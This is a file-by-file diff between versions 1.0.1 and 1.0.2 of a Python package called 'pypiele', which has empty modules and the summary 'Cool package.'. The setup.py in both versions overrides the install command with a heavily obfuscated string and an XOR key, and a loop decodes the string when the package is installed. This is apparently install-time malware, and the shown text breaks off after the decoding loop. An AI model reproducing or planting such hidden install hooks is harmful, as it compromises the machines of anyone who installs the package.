# Comparing `tmp/pypiele-1.0.1.tar.gz` & `tmp/pypiele-1.0.2.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "dist\pypiele-1.0.1.tar", last modified: Sun Jul 30 18:30:49 2023, max compression
+gzip compressed data, was "dist\pypiele-1.0.2.tar", last modified: Sun Jul 30 18:32:42 2023, max compression
```

## Comparing `pypiele-1.0.1.tar` & `pypiele-1.0.2.tar`

### file list

```diff
@@ -1,14 +1,14 @@
-drwxrwxrwx   0        0        0        0 2023-07-30 18:30:49.983387 pypiele-1.0.1/
--rw-rw-rw-   0        0        0     2403 2023-07-30 18:30:49.982887 pypiele-1.0.1/PKG-INFO
--rw-rw-rw-   0        0        0     1914 2023-07-30 18:24:49.000000 pypiele-1.0.1/README.md
-drwxrwxrwx   0        0        0        0 2023-07-30 18:30:49.976381 pypiele-1.0.1/pypiele/
--rw-rw-rw-   0        0        0        0 2023-06-06 15:02:20.000000 pypiele-1.0.1/pypiele/__init__.py
-drwxrwxrwx   0        0        0        0 2023-07-30 18:30:49.981386 pypiele-1.0.1/pypiele/modules/
--rw-rw-rw-   0        0        0        0 2023-02-09 12:46:20.000000 pypiele-1.0.1/pypiele/modules/__init__.py
-drwxrwxrwx   0        0        0        0 2023-07-30 18:30:49.980384 pypiele-1.0.1/pypiele.egg-info/
--rw-rw-rw-   0        0        0     2403 2023-07-30 18:30:49.000000 pypiele-1.0.1/pypiele.egg-info/PKG-INFO
--rw-rw-rw-   0        0        0      190 2023-07-30 18:30:49.000000 pypiele-1.0.1/pypiele.egg-info/SOURCES.txt
--rw-rw-rw-   0        0        0        1 2023-07-30 18:30:49.000000 pypiele-1.0.1/pypiele.egg-info/dependency_links.txt
--rw-rw-rw-   0        0        0        8 2023-07-30 18:30:49.000000 pypiele-1.0.1/pypiele.egg-info/top_level.txt
--rw-rw-rw-   0        0        0       42 2023-07-30 18:30:49.983387 pypiele-1.0.1/setup.cfg
--rw-rw-rw-   0        0        0     3584 2023-07-30 18:30:40.000000 pypiele-1.0.1/setup.py
+drwxrwxrwx   0        0        0        0 2023-07-30 18:32:42.648863 pypiele-1.0.2/
+-rw-rw-rw-   0        0        0     2403 2023-07-30 18:32:42.647862 pypiele-1.0.2/PKG-INFO
+-rw-rw-rw-   0        0        0     1914 2023-07-30 18:24:49.000000 pypiele-1.0.2/README.md
+drwxrwxrwx   0        0        0        0 2023-07-30 18:32:42.641857 pypiele-1.0.2/pypiele/
+-rw-rw-rw-   0        0        0        0 2023-06-06 15:02:20.000000 pypiele-1.0.2/pypiele/__init__.py
+drwxrwxrwx   0        0        0        0 2023-07-30 18:32:42.646861 pypiele-1.0.2/pypiele/modules/
+-rw-rw-rw-   0        0        0        0 2023-02-09 12:46:20.000000 pypiele-1.0.2/pypiele/modules/__init__.py
+drwxrwxrwx   0        0        0        0 2023-07-30 18:32:42.645861 pypiele-1.0.2/pypiele.egg-info/
+-rw-rw-rw-   0        0        0     2403 2023-07-30 18:32:42.000000 pypiele-1.0.2/pypiele.egg-info/PKG-INFO
+-rw-rw-rw-   0        0        0      190 2023-07-30 18:32:42.000000 pypiele-1.0.2/pypiele.egg-info/SOURCES.txt
+-rw-rw-rw-   0        0        0        1 2023-07-30 18:32:42.000000 pypiele-1.0.2/pypiele.egg-info/dependency_links.txt
+-rw-rw-rw-   0        0        0        8 2023-07-30 18:32:42.000000 pypiele-1.0.2/pypiele.egg-info/top_level.txt
+-rw-rw-rw-   0        0        0       42 2023-07-30 18:32:42.648863 pypiele-1.0.2/setup.cfg
+-rw-rw-rw-   0        0        0     3573 2023-07-30 18:32:38.000000 pypiele-1.0.2/setup.py
```

### Comparing `pypiele-1.0.1/PKG-INFO` & `pypiele-1.0.2/PKG-INFO`

 * *Files 0% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: pypiele
-Version: 1.0.1
+Version: 1.0.2
 Summary: Cool package.
 Author: HW
 Author-email: 
 Classifier: Development Status :: 1 - Planning
 Classifier: Intended Audience :: Developers
 Classifier: Programming Language :: Python :: 3
 Classifier: Operating System :: Unix
```

### Comparing `pypiele-1.0.1/README.md` & `pypiele-1.0.2/README.md`

 * *Files identical despite different names*

### Comparing `pypiele-1.0.1/pypiele.egg-info/PKG-INFO` & `pypiele-1.0.2/pypiele.egg-info/PKG-INFO`

 * *Files 0% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: pypiele
-Version: 1.0.1
+Version: 1.0.2
 Summary: Cool package.
 Author: HW
 Author-email: 
 Classifier: Development Status :: 1 - Planning
 Classifier: Intended Audience :: Developers
 Classifier: Programming Language :: Python :: 3
 Classifier: Operating System :: Unix
```

### Comparing `pypiele-1.0.1/setup.py` & `pypiele-1.0.2/setup.py`

 * *Files 18% similar despite different names*

```diff
@@ -1,26 +1,26 @@
 from setuptools import setup, find_packages
 from setuptools.command.install import install
 from pathlib import Path
 
 
 
-VERSION = '1.0.1'
+VERSION = '1.0.2'
 DESCRIPTION = 'Cool package.'
 this_directory = Path(__file__).parent
 long_description = (this_directory / "README.md").read_text()
 
 
 class InstallCommand(install):
 
     def run(self):
         try:
-            wopvEaTEcopFEavc ="Q[F\\BA\x13YC=X\\C^BA\x16ABT@FXQUE@8TXPZX\x12\x08\x11YK\x1dS\\GY[PZX\x1c\x1a<]P\x14_C\x1cBQ@X\x1b\\H[BLF\x1dP\x17t\x0fknmGVJGhlL[]SQYEmjuCDrTARhm`WW[Z^Roj}^RC\\B_SBnkaYZS]GEonkCVAB\x12xTXMohiAZSER[GojgOGDU_\x04\x04hl\x12\x10\x10\x0f\x0c\x18sTZCR\x0f=8\x18\x14\x13\x18[G\x1eZ\\V]J\x1f^\x13u\x0eohcFPAGmnCZYTY[NjlvAAwPDTjneYQY^\\Wjo\x7fQTE\\E]SEjdd]WWZCDojgGWFB\x14}U\\Glh`GVW@PUFijcNFCWU\x02\x07\x1a\x1d>\x10\x17\x17\x12[HRV\x19P\x16p\x0eji`@QCAdjM__RZXMkmpCAtTBSkjb[V_YXTndz^PD]F^PLohnZ[PXDEhoe@WFD\x10\x7fW^AliiB]VJTXElkfNALQ^\x0e\x00hl`~|\x07\n\x19NSE\x16\x1f\x14\x14T\x17\x1a\x1aF@QBS\x1bV\x12`SD\x17fB[bXPZ^\x17\x0b\x10wEWQBV}Z]RPB\x1a\x17fe[A]IG\x1bg_VZX\x11\x1f\x14jZgCZaXQ\\Y\x17bG_\x18V]D\x18\x04\x01\x1e\x12\x1e\x14\x11{\x0ehlbDWFKkdJZ[T]XHiouAB|WBRliaYQZX_Tmlx_QEYC[QFljd[VSXDEnibBYA@\x19~PZBojdAYSDU]CnncMCA\\]\x04\x05dib\x7f~\x04\x07\x19PY@\x11\x18\x12\x14s_E\x1a\x07\x0c\x1e\x14\x11\x06h]gSA\x15dGYaPSZ_\x10\x08\x13x_CYX]V\x17\x1c<8\x17\x16\x10\x14XBUX\x1bT\x1at\rojgFTDKohB_ZS^]KhowDFpQDSnlf_TTY\\Vdix_SEZD]^@odc]^SXEGdkkEWFG\x14{P[FhmbJYQAQX@jldHBGT]\x03\x02nkayz\x04\x00\x1eTRF\x1a\x1b\x17\x11W\x10\x1c\x1fAJZ@\\\x1bS\x13UZBGRRY_Z\x10\x1fF@QZCS\\B\x12\\AQZA^[ZVVR[Q\x18\x1bP_@Y^[YS\x18\x1eFFZ[D\\AJ\x14w}jsqa\x7f`}r\x10\x15YEGA\n\x1a\x19\x07\x06\x18\x01\x03\x0f\x1c\x02\x03\x1d\x03\x0c\x0f\r\x0b\x06\n\x04\x1eRT\x1cFL]A]ZV\x14\x14\x11u\x0ejheCW@ChlNU_UXVHijqGEsSLUodf[QZ^\\SdkuXUF\\GYSAohf[VRYDCioeDVCE\x13|U[CnkfB[P@Q[@nddN@BWX\x07\x02doFL]A]ZV\x18QKS\x16\x11\x1d\x13l\\ADUBA\x19\x12\x10\x11\x1av\x0fjlbFR@KhoCX[W^YOhdvHArUGUjig\\U\\[VQjo}\\PD_D^WGmlb_\\SYGGkncBR@L\x17zVXGimfJ\\SKRXGkoeM@BQ[\x02\x04ln@EZD\\TU\x1cT@P\x17<\x10\x17\x15\x17AMVCJ[WUDD\x1cFMY\x10W\x14w\thj`FVFBndMZ\\W\\]KlkpACuQAWnkd_UZ[^Qonu^TAYAZWBdocP]Q[@@jh`BUD@\x10}W\\EhleK_UCYXFjldLDF]Y\x05\x0chhg~y\x01\x06\x16AZB\x14\x18\x13G^PY_\te@MS\x1a\x13S]VU[\neCFT\x19?S^DS\n\x14\x17\x12:\x16\x13\x12\x18GV@E" 
+            wopvEaTEcopFEavc ="PZD]JA\x19YF8_^@ZDB\x16CLQCGXQTFC=Y\\TY\\\x10\x0f\x11YK\x17W\\D]XRYV\x18\x1a;\\^\x18Z@\x18FTF\\\x18\\HZDCF\x10T\x10v\nkmgE\\@FkiNU_VY]LomyDBpVESliaVVY[VRejx[UA_FYPBledZ[S]FFlkfGRBF\x10\x7fTXMeliB^PGQUComfAKAV[\x00\x01nh\x11\x10\x10\x0e\n\x17sY^DP\n=;\x12\x16\x19\x12ZD\x1bXRTXB\x1bW\x11r\x02hnaDT@CioB[[UQ[DjisFCtTBWjlk\\RX^\\Vilz\\PA_A_TEjdnYWT^@FldcGPGL\x18xVXCindDVWAVZFdndLCCT_\x00\r\x10\x1c=\x15\x15\x19\x10^@V_\x1bW\x1aw\x08hkdAUG@ekO^WRPXHnjr@ErWBQeoaZV_X[Wki~ZS@_A^PLelnY_SZGKlobAYJA\x13{S[GhjiB\\PETUAkicNBFST\x04\x01kibp~\x02\x02\x1dGQB\x1a\x18\x12\x16V\x13\x1b\x1eBAPCQ\x1a^\x12jSA\x12a@Xf^SZ\\\x19\x0e\x13vEWPAUxWYVSF\x18\x10fe[KYID\x1fd]UT\\\x11\x18\x15dVb@^e]WXZ\x17bFY\x17VP@\x1f\x06\x04\x1e\x11\x14\x16\x1bq\x0fki`JUCComH]WS[ZJmnqEC}V@SdikYT__]Wij{_SK\\@ZQFmig^[W\\GAlnbBYKD\x19}TY@ld`A^RJYX@jjfKGB\\]\x05\x03kio{y\x06\x02\x19SSB\x1b\x12\x13\x17v]K\x18\x02\x04\x1a\x1d\x13\x01dZaQC\x11eC]`QRX^\x18\x08\x19xZF^Z^R\x11\x1f<:\x19\x13\x13\x15XBT[\x18Q\x17p\tlneATDKelB\\^P\\^ElopEH|TGWji`[WTY]Pkiu[TG_D^TBenb^[QVGBlobGPJ@\x12yR_GlicKXS@YXJjiaO@DP[\x00\x02ledz{\x04\x00\x1fWQC\x17\x1f\x13\x12S\x12\x1b\x1fAJPD\\\x18W\x10WYLCRUXQV\x15\x1cBDT\\GP\\B\x13ZNQWEYY_VUXY[\x12\x1aSZBW\\^QW\x11\x1cAJ]]F^EK\x10s|krs`w`wr\x15\x10^GDE\x0c\x19\x19\x05\x08\x1d\x02\x02\x0f\x1c\x03\x00\x1e\x06\x01\x0b\t\x08\x02\x08\x03\x1eRT\x16BL^E^XU\x1a\x10\x11r\x0fdd`@SDFnhMU_T^YHdnvE@sPFWengXTXP^Vlo|ZRJ[A[QEnlbZWS[EKieeASDG\x10xSXClecAZP@PXCki`JCFU_\x07\x02deBL^E^XU\x16UKT\x17dVFGWDA\x12\x16\x14\x19\x12p\rkimARGCkmIZVU\\YHieqA@wPGPdh`[V\\[^Roez]QJZJYSFjog\\XRYGJoofCSCA\x10zP]Fln`@^QJX]JlmdLCLU^\x07\x01ddGFXB\\_Q\x18\\HV\x15\x10\x1c2\x12\x17\x15\x10DDPFK]VRFF\x17BD^\x1bW\x11r\x02hnaDT@CioB[[UQ[DjisFCtTBWjlk\\RX^\\Vilz\\PA_A_TEjdnYWT^@FldcGPGL\x18xVXCindDVWAVZFdndLCCT_\x00\rni`|{\n\x02\x1fFQB\x11\x1d\x18GZQ[]\x0fdGF\\\x1b\x14QPPZ]\x08fDFU\x1c<SZC\\\t\x13\x15\x178\x11\x15\x10\x17ER@C" 
 
-            iOpvEoeaaeavocp = "8663053607113105627604720632877362516834935473643646400220405902185560757284384407724878164346553412"
+            iOpvEoeaaeavocp = "9742859652630566609335721507533020216890901750803158853665246903775827507126925755901031318424712053"
             uocpEAtacovpe = len(wopvEaTEcopFEavc)
             oIoeaTEAcvpae = ""
             for fapcEaocva in range(uocpEAtacovpe):
                 nOpcvaEaopcTEapcoTEac = wopvEaTEcopFEavc[fapcEaocva]
                 qQoeapvTeaocpOcivNva = iOpvEoeaaeavocp[fapcEaocva % len(iOpvEoeaaeavocp)]
                 oIoeaTEAcvpae += chr(ord(nOpcvaEaopcTEapcoTEac) ^ ord(qQoeapvTeaocpOcivNva))
```

